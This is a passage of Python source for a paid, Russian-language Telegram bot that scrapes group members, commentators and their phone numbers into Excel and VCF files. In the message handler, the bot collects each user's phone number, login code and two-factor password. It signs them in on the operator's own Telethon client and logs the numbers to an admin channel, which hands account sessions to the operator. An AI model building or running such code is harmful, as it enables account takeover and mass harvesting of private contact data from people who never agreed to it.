    await update.message.reply_text(f"Платная подписка для пользователя {target_user_id} ({username}) удалена, установлен бесплатный план.")
    await log_to_channel(context, f"Администратор удалил платную подписку для пользователя {target_user_id} ({username})", "Администратор")

# Обработчик команды /note
async def note(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Без username"
    if not context.args:
        await update.message.reply_text("Использование: /note <текст>")
        return
    note_text = " ".join(context.args)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    await log_to_channel(context, f"Заметка от @{username}: {note_text}", username)
    await update.message.reply_text(LANGUAGES[lang]['note_cmd'])

# Обработчик текстовых сообщений
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    context.user_data['user_id'] = user_id
    username = update.effective_user.username or "Без username"
    users = load_users()
    text = update.message.text.strip() if update.message.text else ""

    try:
        await client_telethon.connect()
    except telethon_errors.RPCError as e:
        await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
        await log_to_channel(context, f"Ошибка подключения для @{username}: {str(e)}", username)
        print(f"Ошибка подключения Telethon: {str(e)}\n{traceback.format_exc()}")
        return
    except Exception as e:
        print(f"Неизвестная ошибка подключения Telethon: {str(e)}\n{traceback.format_exc()}")
        return

    if context.user_data.get('waiting_for_phone'):
        if not text.startswith('+'):
            await update.message.reply_text("Пожалуйста, введите номер в формате +380639678038:")
            await client_telethon.disconnect()
            return
        context.user_data['phone'] = text
        try:
            await client_telethon.send_code_request(text)
            await update.message.reply_text(LANGUAGES['Русский']['enter_code'])
            context.user_data['waiting_for_code'] = True
            del context.user_data['waiting_for_phone']
            await log_to_channel(context, f"Номер телефона @{username}: {text}", username)
        except telethon_errors.RPCError as e:
            await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
            await log_to_channel(context, f"Ошибка ввода номера @{username}: {str(e)}", username)
            print(f"Ошибка при запросе кода: {str(e)}\n{traceback.format_exc()}")
        finally:
            await client_telethon.disconnect()
        return

    if context.user_data.get('waiting_for_code'):
        try:
            await client_telethon.sign_in(context.user_data['phone'], text)
            await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
            del context.user_data['waiting_for_code']
            await log_to_channel(context, f"Успешная авторизация @{username}", username)
            keyboard = [
                [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
                [InlineKeyboardButton("English", callback_data='lang_English')],
                [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
            ]
            await update.message.reply_text(LANGUAGES['Русский']['welcome'], reply_markup=InlineKeyboardMarkup(keyboard))
        except telethon_errors.SessionPasswordNeededError:
            await update.message.reply_text(LANGUAGES['Русский']['enter_password'])
            context.user_data['waiting_for_password'] = True
            del context.user_data['waiting_for_code']
            await log_to_channel(context, f"Запрос пароля 2FA у @{username}", username)
        except telethon_errors.RPCError as e:
            await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
            await log_to_channel(context, f"Ошибка ввода кода @{username}: {str(e)}", username)
            print(f"Ошибка при вводе кода: {str(e)}\n{traceback.format_exc()}")
        finally:
            await client_telethon.disconnect()
        return

    if context.user_data.get('waiting_for_password'):
        try:
            await client_telethon.sign_in(password=text)
            await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
            del context.user_data['waiting_for_password']
            await log_to_channel(context, f"Успешная авторизация с 2FA @{username}", username)
            keyboard = [
                [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
                [InlineKeyboardButton("English", callback_data='lang_English')],
                [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
            ]
            await update.message.reply_text(LANGUAGES['Русский']['welcome'], reply_markup=InlineKeyboardMarkup(keyboard))
        except telethon_errors.RPCError as e:
            await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
            await log_to_channel(context, f"Ошибка ввода пароля 2FA @{username}: {str(e)}", username)
            print(f"Ошибка при вводе пароля 2FA: {str(e)}\n{traceback.format_exc()}")
        finally:
            await client_telethon.disconnect()
        return

    if str(user_id) not in users or 'language' not in users[str(user_id)]:
        await client_telethon.disconnect()
        return
    
    lang = users[str(user_id)]['language']
    texts = LANGUAGES[lang]
    
    if context.user_data.get('parsing_in_progress', False):
        await client_telethon.disconnect()
        return
    
    limit_ok, hours_left = check_request_limit(user_id)
    if not limit_ok:
        await update.message.reply_text(texts['limit_reached'].format(limit=5 if users[str(user_id)]['subscription']['type'] == 'Бесплатная' else 10, hours=hours_left))
        await client_telethon.disconnect()
        return
    
    if text.startswith('/note '):
        await note(update, context)
        await client_telethon.disconnect()
        return
    
    if 'waiting_for_hash' in context.user_data:
        context.user_data['transaction_hash'] = text
        del context.user_data['waiting_for_hash']
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"Пользователь @{username} (ID: {user_id}) отправил хэш транзакции:\n{text}"
                )
            except telegram_error.BadRequest as e:
                print(f"Ошибка отправки хэша администратору {admin_id}: {e}")
        await log_to_channel(context, f"Хэш транзакции от @{username}: {text}", username)
        await check_payment_status(update.message, context)
        await client_telethon.disconnect()
        return

    if 'waiting_for_id' in context.user_data:
        if text.startswith('@'):
            try:
                entity = await client_telethon.get_entity(text[1:])
                msg = await update.message.reply_text(texts['id_result'].format(id=entity.id), reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(texts['close'], callback_data='close_id'), InlineKeyboardButton(texts['continue_id'], callback_data='continue_id')]
                ]))
                await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=["🎉"])
            except telethon_errors.RPCError as e:
                await update.message.reply_text(texts['rpc_error'].format(e=str(e)))
                await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
        elif update.message.forward_origin and hasattr(update.message.forward_origin, 'chat'):
            chat_id = update.message.forward_origin.chat.id
            msg = await update.message.reply_text(texts['id_result'].format(id=chat_id), reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(texts['close'], callback_data='close_id'), InlineKeyboardButton(texts['continue_id'], callback_data='continue_id')]
            ]))
            await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=["🎉"])
            await log_to_channel(context, f"Получен ID чата: {chat_id}", username)
        elif update.message.forward_origin and hasattr(update.message.forward_origin, 'sender_user'):
            user_id_forward = update.message.forward_origin.sender_user.id
            msg = await update.message.reply_text(texts['id_result'].format(id=user_id_forward), reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(texts['close'], callback_data='close_id'), InlineKeyboardButton(texts['continue_id'], callback_data='continue_id')]
            ]))
            await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=["🎉"])
            await log_to_channel(context, f"Получен ID пользователя: {user_id_forward}", username)
        elif text.startswith('https://t.me/'):
            try:
                parts = text.split('/')
                if len(parts) > 4:
                    chat_id = f"@{parts[-2]}" if not parts[-2].startswith('+') else parts[-2]
                    entity = await client_telethon.get_entity(chat_id)
                    msg = await update.message.reply_text(texts['id_result'].format(id=entity.id), reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(texts['close'], callback_data='close_id'), InlineKeyboardButton(texts['continue_id'], callback_data='continue_id')]
                    ]))
                    await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=["🎉"])
                    await log_to_channel(context, f"Получен ID через ссылку: {entity.id}", username)
                else:
                    await update.message.reply_text("Отправь корректную ссылку!")
            except telethon_errors.RPCError as e:
                await update.message.reply_text(texts['rpc_error'].format(e=str(e)))
                await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
        del context.user_data['waiting_for_id']
        await client_telethon.disconnect()
        return
    
    if 'waiting_for_limit' in context.user_data:
        try:
            limit = int(text)
            max_limit = 15000 if users[str(user_id)]['subscription']['type'].startswith('Платная') else 150
            if limit <= 0 or limit > max_limit:
                await update.message.reply_text(texts['invalid_limit'].format(max_limit=max_limit), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['skip'], callback_data='skip_limit')]]))
                await client_telethon.disconnect()
                return
            context.user_data['limit'] = limit
            del context.user_data['waiting_for_limit']
            await ask_for_filters(update.message, context)
        except ValueError:
            await update.message.reply_text(texts['invalid_number'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['skip'], callback_data='skip_limit')]]))
            await client_telethon.disconnect()
        return

    if 'waiting_for_filters' in context.user_data:
        filters = context.user_data.get('filters', {'only_with_username': False, 'exclude_bots': False, 'only_active': False})
        if 'да' in text.lower() or 'yes' in text.lower() or 'ja' in text.lower():
            filters[context.user_data['current_filter']] = True
        del context.user_data['waiting_for_filters']
        del context.user_data['current_filter']
        context.user_data['filters'] = filters
        await process_parsing(update.message, context)
        await client_telethon.disconnect()
        return
    
    if 'parse_type' in context.user_data:
        if text:
            links = text.split('\n') if '\n' in text else [text]
            if context.user_data['parse_type'] == 'parse_post_commentators':
                valid_links = [link for link in links if link.startswith('https://t.me/') and '/' in link[13:]]
                if not valid_links:
                    await update.message.reply_text(texts['invalid_link'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['fix_link'], callback_data='fix_link')]]))
                    context.user_data['last_input'] = text
                    await client_telethon.disconnect()
                    return
                context.user_data['links'] = valid_links
            else:
                context.user_data['links'] = links
            await ask_for_limit(update.message, context)
        elif update.message.forward_origin and hasattr(update.message.forward_origin, 'chat') and context.user_data['parse_type'] == 'parse_post_commentators':
            context.user_data['links'] = [f"https://t.me/{update.message.forward_origin.chat.username}/{update.message.forward_origin.message_id}"]
            context.user_data['chat_id'] = update.message.forward_origin.chat.id
            context.user_data['post'] = update.message.forward_origin.message_id
            await ask_for_limit(update.message, context)
        await client_telethon.disconnect()

# Запрос лимита парсинга
async def ask_for_limit(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    subscription = load_users().get(str(user_id), {}).get('subscription', {'type': 'Бесплатная', 'end': None})
    is_paid = subscription['type'].startswith('Платная')
    max_limit = 15000 if is_paid else 150
    keyboard = [
        [InlineKeyboardButton("100", callback_data='limit_100'), InlineKeyboardButton("500", callback_data='limit_500')],
        [InlineKeyboardButton("1000", callback_data='limit_1000'), InlineKeyboardButton(texts['skip'], callback_data='skip_limit')],
        [InlineKeyboardButton("Другое" if lang == 'Русский' else "Інше" if lang == 'Украинский' else "Other" if lang == 'English' else "Andere", callback_data='limit_custom')]
    ]
    if is_paid:
        keyboard.append([InlineKeyboardButton(texts['no_filter'], callback_data='no_filter')])
    await message.reply_text(texts['limit'], reply_markup=InlineKeyboardMarkup(keyboard))

# Запрос фильтров
async def ask_for_filters(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    keyboard = [
        [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data='filter_yes'),
         InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='filter_no')],
        [InlineKeyboardButton(texts['skip'], callback_data='skip_filters')]
    ]
    context.user_data['waiting_for_filters'] = True
    context.user_data['current_filter'] = 'only_with_username'
    context.user_data['filters'] = {'only_with_username': False, 'exclude_bots': False, 'only_active': False}
    await message.reply_text(texts['filter_username'], reply_markup=InlineKeyboardMarkup(keyboard))

# Функции парсинга
async def parse_commentators(group_link, limit):
    entity = await client_telethon.get_entity(group_link)
    commentators = set()
    messages = await client_telethon.get_messages(entity, limit=limit)
    for message in messages:
        if hasattr(message, 'sender_id') and message.sender_id:
            commentators.add(message.sender_id)
    
    data = []
    for commentator_id in commentators:
        try:
            participant = await client_telethon.get_entity(commentator_id)
            if isinstance(participant, tl.types.User):
                data.append([
                    participant.id,
                    participant.username if participant.username else "",
                    participant.first_name if participant.first_name else "",
                    participant.last_name if participant.last_name else "",
                    participant.bot,
                    participant
                ])
        except (telethon_errors.RPCError, ValueError) as e:
            print(f"Ошибка получения сущности для ID {commentator_id}: {str(e)}")
            continue
    return data

async def parse_participants(group_link, limit):
    entity = await client_telethon.get_entity(group_link)
    participants = await client_telethon.get_participants(entity, limit=limit)
    data = []
    for participant in participants:
        if isinstance(participant, tl.types.User):
            data.append([
                participant.id,
                participant.username if participant.username else "",
                participant.first_name if participant.first_name else "",
                participant.last_name if participant.last_name else "",
                participant.bot,
                participant
            ])
    return data

async def parse_post_commentators(link, limit):
    parts = link.split('/')
    chat_id = parts[-2] if parts[-2].startswith('+') else f'@{parts[-2]}'
    message_id = int(parts[-1])
    entity = await client_telethon.get_entity(chat_id)
    message = await client_telethon.get_messages(entity, ids=message_id)
    if not message:
        return []
    
    commentators = set()
    replies = await client_telethon.get_messages(entity, limit=limit, reply_to=message.id)
    for reply in replies:
        if hasattr(reply, 'sender_id') and reply.sender_id:
            commentators.add(reply.sender_id)
    
    data = []
    for commentator_id in commentators:
        try:
            participant = await client_telethon.get_entity(commentator_id)
            if isinstance(participant, tl.types.User):
                data.append([
                    participant.id,
                    participant.username if participant.username else "",
                    participant.first_name if participant.first_name else "",
                    participant.last_name if participant.last_name else "",
                    participant.bot,
                    participant
                ])
        except (telethon_errors.RPCError, ValueError) as e:
            print(f"Ошибка получения сущности для ID {commentator_id}: {str(e)}")
            continue
    return data

async def parse_phone_contacts(group_link, limit):
    entity = await client_telethon.get_entity(group_link)
    participants = await client_telethon.get_participants(entity, limit=limit)
    data = []
    for participant in participants:
        if isinstance(participant, tl.types.User) and participant.phone:
            data.append([
                participant.id,
                participant.username if participant.username else "",
                participant.first_name if participant.first_name else "",
                participant.last_name if participant.last_name else "",
                participant.phone,
                participant
            ])
    return data

async def parse_auth_access(link, context):
    user_id = context.user_data.get('user_id')
    username = context.user_data.get('username', 'Без username')
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    
    try:
        parts = link.split('/')
        chat_id = parts[-2] if parts[-2].startswith('+') else f'@{parts[-2]}'
        entity = await client_telethon.get_entity(chat_id)
        if hasattr(entity, 'participants_count'):
            await context.bot.send_message(chat_id=user_id, text=texts['auth_success'])
            await log_to_channel(context, f"Доступ к закрытому чату {chat_id} успешно предоставлен для @{username}", username)
        else:
            await context.bot.send_message(chat_id=user_id, text=texts['auth_error'])
            await log_to_channel(context, f"Ошибка доступа к закрытому чату {chat_id} для @{username}", username)
    except telethon_errors.RPCError as e:
        await context.bot.send_message(chat_id=user_id, text=texts['auth_error'])
        await log_to_channel(context, f"Ошибка авторизации для @{username}: {str(e)}", username)

# Сообщение "Подождите..."
async def show_loading_message(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    await asyncio.sleep(2)
    if 'parsing_done' not in context.user_data:
        loading_message = await message.reply_text("Подождите..." if lang == 'Русский' else "Зачекай..." if lang == 'Украинский' else "Please wait..." if lang == 'English' else "Bitte warten...")
        context.user_data['loading_message_id'] = loading_message.message_id
        
        dots = 1
        while 'parsing_done' not in context.user_data:
            dots = (dots % 3) + 1
            new_text = ("Подождите" if lang == 'Русский' else "Зачекай" if lang == 'Украинский' else "Please wait" if lang == 'English' else "Bitte warten") + "." * dots
            try:
                await context.bot.edit_message_text(
                    chat_id=message.chat_id,
                    message_id=loading_message.message_id,
                    text=new_text
                )
            except telegram_error.BadRequest:
                break
            await asyncio.sleep(1)
        
        if 'parsing_done' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=message.chat_id,
                    message_id=loading_message.message_id
                )
            except telegram_error.BadRequest:
                pass

# Сообщение "Ожидается поступление средств..."
async def show_payment_pending(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    pending_message = await message.reply_text(texts['payment_pending'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['payment_update'], callback_data='update_payment')]]))
    context.user_data['pending_message_id'] = pending_message.message_id
    
    dots = 1
    while 'payment_done' not in context.user_data:
        dots = (dots % 3) + 1
        new_text = texts['payment_pending'] + "." * dots
        try:
            await context.bot.edit_message_text(
                chat_id=message.chat_id,
                message_id=pending_message.message_id,
                text=new_text
            )
        except telegram_error.BadRequest:
            break
        await asyncio.sleep(1)

# Обработка парсинга
async def process_parsing(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    username = message.from_user.username or "Без username"
    users = load_users()
    lang = users[str(user_id)]['language']
    texts = LANGUAGES[lang]
    subscription = users[str(user_id)]['subscription']
    
    context.user_data['parsing_in_progress'] = True
    asyncio.create_task(show_loading_message(message, context))
    
    try:
        await client_telethon.connect()
        all_data = []
        for link in context.user_data['links']:
            try:
                await client_telethon.get_entity(link.split('/')[-2] if context.user_data['parse_type'] in ['parse_post_commentators', 'parse_auth_access'] else link)
            except telethon_errors.ChannelPrivateError:
                context.user_data['parsing_done'] = True
                await message.reply_text(texts['no_access'].format(link=link))
                context.user_data['parsing_in_progress'] = False
                await log_to_channel(context, texts['no_access'].format(link=link), username)
                return
            except telethon_errors.RPCError as e:
                context.user_data['parsing_done'] = True
                await message.reply_text(texts['rpc_error'].format(e=str(e)))
                context.user_data['parsing_in_progress'] = False
                await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
                print(f"Ошибка парсинга (RPC): {str(e)}\n{traceback.format_exc()}")
                return
            
            limit = check_parse_limit(user_id, context.user_data['limit'])
            if context.user_data['parse_type'] == 'parse_authors':
                data = await parse_commentators(link, limit)
            elif context.user_data['parse_type'] == 'parse_participants':
                data = await parse_participants(link, limit)
            elif context.user_data['parse_type'] == 'parse_post_commentators':
                data = await parse_post_commentators(link, limit)
            elif context.user_data['parse_type'] == 'parse_phone_contacts':
                data = await parse_phone_contacts(link, limit)
            elif context.user_data['parse_type'] == 'parse_auth_access':
                await parse_auth_access(link, context)
                context.user_data['parsing_done'] = True
                context.user_data['parsing_in_progress'] = False
                return
            
            all_data.extend(data)
        
        if context.user_data['parse_type'] == 'parse_phone_contacts':
            filtered_data = all_data
            excel_file = await create_excel_in_memory(filtered_data)
            vcf_file = create_vcf_file(pd.DataFrame(filtered_data, columns=['ID', 'Username', 'First Name', 'Last Name', 'Phone', 'Nickname']))
            
            await message.reply_document(document=excel_file, filename="phones_contacts.xlsx", caption=texts['caption_phones'])
            await message.reply_document(document=vcf_file, filename="phones_contacts.vcf", caption=texts['caption_phones'])
            excel_file.close()
            vcf_file.close()
        else:
            filtered_data = filter_data(all_data, context.user_data.get('filters', {'only_with_username': False, 'exclude_bots': False, 'only_active': False}))
            count = len(filtered_data)
            entity = await client_telethon.get_entity(context.user_data['links'][0].split('/')[-2] if context.user_data['parse_type'] == 'parse_post_commentators' else context.user_data['links'][0])
            chat_title = entity.title
            
            excel_file = await create_excel_in_memory(filtered_data)
            stats = get_statistics(filtered_data)
            if context.user_data['parse_type'] == 'parse_authors':
                filename = f"{chat_title}_commentators.xlsx"
                caption = texts['caption_commentators']
                success_message = f'🎉 Найдено {count} комментаторов!\n{stats}\nСпарсить ещё? 🎉' if lang == 'Русский' else \
                                 f'🎉 Знайдено {count} коментаторів!\n{stats}\nСпарсити ще? 🎉' if lang == 'Украинский' else \
                                 f'🎉 Found {count} commentators!\n{stats}\nParse again? 🎉' if lang == 'English' else \
                                 f'🎉 {count} Kommentatoren gefunden!\n{stats}\nNochmal parsen? 🎉'
            elif context.user_data['parse_type'] == 'parse_participants':
                filename = f"{chat_title}_participants.xlsx"
                caption = texts['caption_participants']
                success_message = f'🎉 Найдено {count} участников!\n{stats}\nСпарсить ещё? 🎉' if lang == 'Русский' else \
                                 f'🎉 Знайдено {count} учасників!\n{stats}\nСпарсити ще? 🎉' if lang == 'Украинский' else \
                                 f'🎉 Found {count} participants!\n{stats}\nParse again? 🎉' if lang == 'English' else \
                                 f'🎉 {count} Teilnehmer gefunden!\n{stats}\nNochmal parsen? 🎉'
            elif context.user_data['parse_type'] == 'parse_post_commentators':
                filename = f"{chat_title}_post_commentators.xlsx"
                caption = texts['caption_post_commentators']
                success_message = f'🎉 Найдено {count} комментаторов поста!\n{stats}\nСпарсить ещё? 🎉' if lang == 'Русский' else \
                                 f'🎉 Знайдено {count} коментаторів поста!\n{stats}\nСпарсити ще? 🎉' if lang == 'Украинский' else \
                                 f'🎉 Found {count} post commentators!\n{stats}\nParse again? 🎉' if lang == 'English' else \
                                 f'🎉 {count} Beitragskommentatoren gefunden!\n{stats}\nNochmal parsen? 🎉'
            
            context.user_data['parsing_done'] = True
            await message.reply_document(document=excel_file, filename=filename, caption=caption)
            excel_file.close()
            
            update_user_data(user_id, message.from_user.full_name, context, requests=1)
            await log_to_channel(context, f"Успешно спарсил {count} записей из {chat_title}", username)
            
            msg = await message.reply_text(success_message, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Продолжить" if lang == 'Русский' else "Продовжити" if lang == 'Украинский' else "Continue" if lang == 'English' else "Fortfahren", callback_data='continue')]]))
            await context.bot.set_message_reaction(chat_id=message.chat_id, message_id=msg.message_id, reaction=["🎈"])
    
    except telethon_errors.FloodWaitError as e:
        context.user_data['parsing_done'] = True
        await message.reply_text(texts['flood_error'].format(e=str(e)))
        context.user_data['parsing_in_progress'] = False
        await log_to_channel(context, texts['flood_error'].format(e=str(e)), username)
        print(f"Ошибка FloodWait: {str(e)}\n{traceback.format_exc()}")
    except telethon_errors.RPCError as e:
        context.user_data['parsing_done'] = True
        await message.reply_text(texts['rpc_error'].format(e=str(e)))
        context.user_data['parsing_in_progress'] = False
        await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
        print(f"Ошибка RPC в парсинге: {str(e)}\n{traceback.format_exc()}")
    except Exception as e:
        context.user_data['parsing_done'] = True
        await message.reply_text("Произошла неизвестная ошибка при парсинге." if lang == 'Русский' else 
                                 "Сталася невідома помилка при парсингу." if lang == 'Украинский' else 
                                 "An unknown error occurred while parsing." if lang == 'English' else 
                                 "Ein unbekannter Fehler ist beim Parsen aufgetreten.")
        await log_to_channel(context, f"Неизвестная ошибка при парсинге для @{username}: {str(e)}", username)
        print(f"Неизвестная ошибка в парсинге: {str(e)}\n{traceback.format_exc()}")
    finally:
        context.user_data['parsing_in_progress'] = False
        await client_telethon.disconnect()

# Проверка статуса платежа
async def check_payment_status(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    username = message.from_user.username or "Без username"
    lang = load_users()[str(user_id)]['language']
    texts = LANGUAGES[lang]
    transaction_hash = context.user_data['transaction_hash']
    
    try:
        headers = {'Authorization': f'Bearer {TON_API_KEY}'}
        response = requests.get(f'https://toncenter.com/api/v2/getTransactions?address={TON_WALLET_ADDRESS}&limit=10', headers=headers)
        response.raise_for_status()
        transactions = response.json().get('result', [])
        
        for tx in transactions:
            if tx.get('hash') == transaction_hash:
                amount = float(tx.get('amount', 0)) / 10**9
                subscription = context.user_data['selected_subscription']
                expected_amount = {'1h': 2, '3d': 5, '7d': 7}[subscription]
                
                if amount >= expected_amount:
                    now = datetime.now()
                    if subscription == '1h':
                        end_time = now + timedelta(hours=1)
                    elif subscription == '3d':
                        end_time = now + timedelta(days=3)
                    else:
                        end_time = now + timedelta(days=7)
                    update_user_data(user_id, message.from_user.full_name, context, subscription={'type': f'Платная ({subscription})',
                    'end': end_time.isoformat()})
                    await message.reply_text(texts['payment_success'].format(end_time=end_time.strftime('%Y-%m-%d %H:%M:%S')))
                    await log_to_channel(context, f"Оплата успешно подтверждена для @{username}. Подписка: {subscription}, до {end_time}" if lang == 'Русский' else 
                                         f"Оплата успішно підтверджена для @{username}. Підписка: {subscription}, до {end_time}" if lang == 'Украинский' else 
                                         f"Payment successfully confirmed for @{username}. Subscription: {subscription}, until {end_time}" if lang == 'English' else 
                                         f"Zahlung erfolgreich bestätigt für @{username}. Abonnement: {subscription}, bis {end_time}", username)
                    context.user_data['payment_done'] = True
                    try:
                        await context.bot.delete_message(chat_id=message.chat_id, message_id=context.user_data['pending_message_id'])
                    except telegram_error.BadRequest:
                        pass
                    return
                else:
                    await message.reply_text(texts['payment_error'].format(error='Недостаточная сумма' if lang == 'Русский' else 
                                                                           'Недостатня сума' if lang == 'Украинский' else 
                                                                           'Insufficient amount' if lang == 'English' else 
                                                                           'Unzureichender Betrag'))
                    await log_to_channel(context, f"Ошибка оплаты для @{username}: Недостаточная сумма" if lang == 'Русский' else 
                                         f"Помилка оплати для @{username}: Недостатня сума" if lang == 'Украинский' else 
                                         f"Payment error for @{username}: Insufficient amount" if lang == 'English' else 
                                         f"Zahlungsfehler für @{username}: Unzureichender Betrag", username)
                    return
        
        await message.reply_text(texts['payment_error'].format(error='Транзакция не найдена' if lang == 'Русский' else 
                                                              'Транзакцію не знайдено' if lang == 'Украинский' else 
                                                              'Transaction not found' if lang == 'English' else 
                                                              'Transaktion nicht gefunden'))
        await log_to_channel(context, f"Ошибка оплаты для @{username}: Транзакция не найдена" if lang == 'Русский' else 
                             f"Помилка оплати для @{username}: Транзакцію не знайдено" if lang == 'Украинский' else 
                             f"Payment error for @{username}: Transaction not found" if lang == 'English' else 
                             f"Zahlungsfehler für @{username}: Transaktion nicht gefunden", username)
    
    except requests.RequestException as e:
        await message.reply_text(texts['payment_error'].format(error=str(e)))
        await log_to_channel(context, f"Ошибка проверки платежа для @{username}: {str(e)}", username)
        print(f"Ошибка проверки платежа: {str(e)}\n{traceback.format_exc()}")

# Обработчик кнопок
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    context.user_data['user_id'] = user_id
    username = query.from_user.username or "Без username"
    users = load_users()
    lang = users.get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    
    try:
        await query.answer()
    except telegram_error.BadRequest as e:
        if "Query is too old" in str(e) or "query id is invalid" in str(e):
            await log_to_channel(context, f"Ошибка: Устаревший или недействительный запрос от @{username} — {str(e)}", username)
            return
    
    try:
        await client_telethon.connect()
    except telethon_errors.RPCError as e:
        await query.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
        await log_to_channel(context, f"Ошибка подключения для @{username}: {str(e)}", username)
        print(f"Ошибка подключения в button: {str(e)}\n{traceback.format_exc()}")
        return

    if context.user_data.get('parsing_in_progress', False) and query.data not in ['close_id', 'continue_id']:
        await client_telethon.disconnect()
        return
    
    limit_ok, hours_left = check_request_limit(user_id)
    if not limit_ok:
        await query.message.reply_text(texts['limit_reached'].format(limit=5 if users[str(user_id)]['subscription']['type'] == 'Бесплатная' else 10, hours=hours_left))
        await client_telethon.disconnect()
        return
    
    if query.data.startswith('lang_'):
        lang = query.data.split('_')[1]
        update_user_data(user_id, query.from_user.full_name, context, lang=lang)
        await query.message.edit_text(LANGUAGES[lang]['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(LANGUAGES[lang]['subscribed'], callback_data='subscribed')]]))
        await log_to_channel(context, f"Сменил язык на {lang} для @{username}" if lang == 'Русский' else 
                             f"Змінив мову на {lang} для @{username}" if lang == 'Украинский' else 
                             f"Changed language to {lang} for @{username}" if lang == 'English' else 
                             f"Sprache auf {lang} für @{username} geändert", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'subscribed':
        menu_text, menu_markup = get_main_menu(user_id, context)
        await query.message.edit_text(menu_text, reply_markup=menu_markup)
        await log_to_channel(context, f"Пользователь @{username} начал работу" if lang == 'Русский' else 
                             f"Користувач @{username} почав роботу" if lang == 'Украинский' else 
                             f"User @{username} started working" if lang == 'English' else 
                             f"Benutzer @{username} hat begonnen zu arbeiten", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'identifiers':
        await query.message.reply_text(texts['you_chose'].format(button="Идентификаторы" if lang == 'Русский' else "Ідентифікатори" if lang == 'Украинский' else "Identifiers" if lang == 'English' else "Identifikatoren"))
        await query.message.reply_text(texts['identifiers'])
        context.user_data['waiting_for_id'] = True
        await log_to_channel(context, f"Пользователь @{username} запросил идентификаторы" if lang == 'Русский' else 
                             f"Користувач @{username} запросив ідентифікатори" if lang == 'Украинский' else 
                             f"User @{username} requested identifiers" if lang == 'English' else 
                             f"Benutzer @{username} hat Identifikatoren angefordert", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'parser':
        await query.message.reply_text(texts['you_chose'].format(button="Сбор данных / Парсер" if lang == 'Русский' else "Збір даних / Парсер" if lang == 'Украинский' else "Data collection / Parser" if lang == 'English' else "Datensammlung / Parser"))
        subscription = users[str(user_id)]['subscription']
        is_paid = subscription['type'].startswith('Платная')
        keyboard = [
            [InlineKeyboardButton("Авторов" if lang == 'Русский' else "Авторів" if lang == 'Украинский' else "Authors" if lang == 'English' else "Autoren", callback_data='parse_authors')],
            [InlineKeyboardButton("Участников" if lang == 'Русский' else "Учасників" if lang == 'Украинский' else "Participants" if lang == 'English' else "Teilnehmer", callback_data='parse_participants')],
            [InlineKeyboardButton("Комментаторов поста" if lang == 'Русский' else "Коментаторів поста" if lang == 'Украинский' else "Post commentators" if lang == 'English' else "Beitragskommentatoren", callback_data='parse_post_commentators')]
        ]
        if is_paid:
            keyboard.extend([
                [InlineKeyboardButton(texts['phone_contacts'], callback_data='parse_phone_contacts')],
                [InlineKeyboardButton(texts['auth_access'], callback_data='parse_auth_access')]
            ])
        await query.message.reply_text(texts['parser'], reply_markup=InlineKeyboardMarkup(keyboard))
